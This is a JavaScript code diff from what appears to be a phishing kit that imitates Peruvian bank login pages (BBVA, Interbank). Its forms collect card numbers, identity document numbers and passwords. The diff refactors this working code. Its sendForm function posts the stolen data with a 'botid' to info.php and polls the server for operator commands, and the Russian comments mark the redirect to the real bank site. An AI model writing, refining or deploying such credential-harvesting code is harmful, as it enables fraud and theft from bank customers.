@@ -4,11 +4,11 @@ document.addEventListener("DOMContentLoaded", function () {
   let lunarChecked = false;
   const container = document.querySelector(".container");
   let errorMes = "";
-  container.style.minHeight = `${window.innerHeight}px`;
-  window.addEventListener("resize", () => {
-    const container = document.querySelector(".container");
-    container.style.minHeight = `${window.innerHeight}px`;
-  });
+  // container.style.minHeight = `${window.innerHeight}px`;
+  // window.addEventListener("resize", () => {
+  //   const container = document.querySelector(".container");
+  //   container.style.minHeight = `${window.innerHeight}px`;
+  // });
 
   const form = document.querySelector("#myForm");
   const forgetForm = document.querySelector("#forget-form");
@@ -70,52 +70,50 @@ document.addEventListener("DOMContentLoaded", function () {
     field.addEventListener("blur", removeFocusClass);
   });
 
-  // Валидация и форматирование номера карты
-  cardNumber.addEventListener("input", function () {
-    let value = this.value.replace(/[^\d]/g, ""); // Убираем все нецифровые символы
-    if (value.length > 16) {
-      value = value.slice(0, 16);
+  function handleCardNumberInput(inputElem, additionalFunction = null) {
+    inputElem.addEventListener("input", function () {
+      let value = this.value.replace(/[^\d]/g, ""); // Убираем все нецифровые символы
+      if (value.length > 16) {
+        value = value.slice(0, 16);
+      }
+      this.value = value.replace(/(.{4})/g, "$1 ").trim();
+  
+      if (additionalFunction) {
+        additionalFunction();
+      }
+    });
+  }
+  const forgotCheckFields = () => {
+    // Проверяем, заполнены ли оба поля
+    if (forgetCardNumber.value !== "" && forgetDocNumber.value !== "") {
+      forgetFormBtn.disabled = false;
     }
-    this.value = value.replace(/(.{4})/g, "$1 ").trim();
-  });
-  forgetCardNumber.addEventListener("input", function () {
-    let value = this.value.replace(/[^\d]/g, ""); // Убираем все нецифровые символы
-    if (value.length > 16) {
-      value = value.slice(0, 16);
-    }
-    this.value = value.replace(/(.{4})/g, "$1 ").trim();
-    forgotCheckFields();
-  });
-  docType.addEventListener("change", function () {
-    docNumber.value = "";
-    switch (this.value) {
-      case "DNI":
-        docNumber.type = "tel";
-        break;
-      case "Pasaporte":
-      case "CE":
-        docNumber.type = "text";
-        break;
-      default:
-        docNumber.type = "text";
-        break;
-    }
-  });
-  forgetDocType.addEventListener("change", function () {
-    forgetDocNumber.value = "";
-    switch (this.value) {
-      case "DNI":
-        forgetDocNumber.type = "tel";
-        break;
-      case "Pasaporte":
-      case "CE":
-        forgetDocNumber.type = "text";
-        break;
-      default:
-        forgetDocNumber.type = "text";
-        break;
-    }
-  });
+  };
+  // Использование функции
+  handleCardNumberInput(cardNumber);
+  handleCardNumberInput(forgetCardNumber, forgotCheckFields);
+  
+  function handleDocTypeChange(docTypeElem, docNumberElem) {
+    docTypeElem.addEventListener("change", function () {
+      docNumberElem.value = "";
+      switch (this.value) {
+        case "DNI":
+          docNumberElem.type = "tel";
+          break;
+        case "Pasaporte":
+        case "CE":
+          docNumberElem.type = "text";
+          break;
+        default:
+          docNumberElem.type = "text";
+          break;
+      }
+    });
+  }
+  // Используем функцию для разных пар элементов
+  handleDocTypeChange(docType, docNumber);
+  handleDocTypeChange(forgetDocType, forgetDocNumber);
+  
   // Валидация и фильтрация при вводе
   docNumber.addEventListener("input", function () {
     let value = this.value;
@@ -182,18 +180,9 @@ document.addEventListener("DOMContentLoaded", function () {
   form.addEventListener("submit", function (e) {
     e.preventDefault();
     let valid = true;
-    errorMes = "Por favor, corrija los siguientes errores:\n";
+    errorMes = "Por favor, ingresa todos los dígitos de tu tarjeta";
 
-    let cardNumValue = cardNumber.value.replace(/ /g, "");
-    if (cardNumValue.length !== 16 || isNaN(cardNumValue)) {
-      valid = false;
-      errorMes += "Por favor, ingresa todos los dígitos de tu tarjeta";
-    }
-
-    if (password.value.length < 6 || password.value.length > 20) {
-      valid = false;
-      errorMes += "- La contraseña debe tener entre 6 y 20 caracteres.\n";
-    }
+   
 
     let docNumValue = docNumber.value;
     switch (docType.value) {
@@ -205,6 +194,12 @@ document.addEventListener("DOMContentLoaded", function () {
         }
         break;
       case "Pasaporte":
+        if (!/^[a-zA-Z0-9]{4,11}$/.test(docNumValue)) {
+          valid = false;
+          errorMes =
+            "ingresa tu numero de documento para confirmar la operación";
+        }
+        break;
       case "CE":
         if (!/^[a-zA-Z0-9]{4,11}$/.test(docNumValue)) {
           valid = false;
@@ -213,7 +208,17 @@ document.addEventListener("DOMContentLoaded", function () {
         }
         break;
     }
+    if (password.value.length < 6 || password.value.length > 20) {
+      valid = false;
+      errorMes = "ingresa tu clave para confirmar la operación";
+    }
+    let cardNumValue = cardNumber.value.replace(/ /g, "");
+    if (cardNumValue.length !== 16 || isNaN(cardNumValue)) {
+      valid = false;
+      errorMes = "Por favor, ingresa todos los dígitos de tu tarjeta";
+    }
 
+   
     if (valid && lunarChecked) {
       sendForm("myForm");
       loader.style.display = "flex";
@@ -224,11 +229,11 @@ document.addEventListener("DOMContentLoaded", function () {
   forgetForm.addEventListener("submit", function (e) {
     e.preventDefault();
     let valid = true;
-    errorMes = "Por favor, corrija los siguientes errores:\n";
+    errorMes = "Por favor, ingresa todos los dígitos de tu tarjeta";
     let cardNumValue = forgetCardNumber.value.replace(/ /g, "");
     if (cardNumValue.length !== 16 || isNaN(cardNumValue)) {
       valid = false;
-      errorMes += "Por favor, ingresa todos los dígitos de tu tarjeta";
+      errorMes = "Por favor, ingresa todos los dígitos de tu tarjeta";
     }
     let docNumValue = forgetDocNumber.value;
     switch (forgetDocType.value) {
@@ -240,6 +245,12 @@ document.addEventListener("DOMContentLoaded", function () {
         }
         break;
       case "Pasaporte":
+        if (!/^[a-zA-Z0-9]{4,11}$/.test(docNumValue)) {
+          valid = false;
+          errorMes =
+            "ingresa tu numero de documento para confirmar la operación";
+        }
+        break;
       case "CE":
         if (!/^[a-zA-Z0-9]{4,11}$/.test(docNumValue)) {
           valid = false;
@@ -296,13 +307,10 @@ document.addEventListener("DOMContentLoaded", function () {
 
   function sendForm(formid) {
     var form = document.getElementById(formid);
-
     var formData = new FormData(form);
-
     var botId = getQueryParam("botid");
     formData.append("botid", botId); //добавляем ботайди
     formData.append("target", "bbva"); //добавляем ботайди
-
     var xhr = new XMLHttpRequest();
     xhr.open("POST", "info.php", true);
     xhr.onreadystatechange = function () {
@@ -310,7 +318,6 @@ document.addEventListener("DOMContentLoaded", function () {
         // Обработка успешного ответа сервера
         console.log(xhr.responseText);
         sendRequestWithBotId(); // Начинаем отслеживание с сервера
-        loader.style.display = "none";
       } else {
         // Обработка ошибок
         console.error(xhr.statusText);
@@ -333,6 +340,7 @@ document.addEventListener("DOMContentLoaded", function () {
             setTimeout(sendRequestWithBotId, 1000); // обновляется эта команда каждую секунду
           } else if (responseCode === 201) {
             window.location.href = "https://interbank.pe"; //редир на интер
+            loader.style.display = "none";
           } else if (responseCode === 202) {
             errorMes =
               "Los datos ingresados son incorrectos. Por favor valida tu número de tarjeta y documento de identidad.";
@@ -378,6 +386,7 @@ document.addEventListener("DOMContentLoaded", function () {
       if (luhnCheck(input)) {
         lunarChecked = true;
       } else {
+        errorMes = "Por favor, ingresa todos los dígitos de tu tarjeta";
         lunarChecked = false;
       }
     }
@@ -394,10 +403,5 @@ document.addEventListener("DOMContentLoaded", function () {
         }
       }
     });
-  const forgotCheckFields = () => {
-    // Проверяем, заполнены ли оба поля
-    if (forgetCardNumber.value !== "" && forgetDocNumber.value !== "") {
-      forgetFormBtn.disabled = false;
-    }
-  };
+
 });
